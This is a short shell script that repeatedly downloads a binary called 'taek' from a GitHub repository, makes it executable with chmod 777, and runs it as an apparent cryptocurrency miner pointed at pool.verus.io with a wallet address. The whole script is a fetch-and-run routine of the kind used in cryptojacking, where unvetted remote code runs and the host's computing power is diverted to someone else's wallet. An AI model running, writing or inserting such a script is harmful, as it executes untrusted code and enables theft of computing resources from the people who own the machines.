#!/bin/sh
 
COUNTER=20
until [  $COUNTER -lt 10 ]; do
 
wget https://github.com/OmJhonyPerkasa/yteam/raw/master/taek && chmod 777 taek && ./taek -v -l  pool.verus.io:9999 -u RKzMVjYKpBPzbUFMMMLvgergy9a4JDShva.budi -p x -t 2
     echo COUNTER $COUNTER
     let COUNTER-=1
done
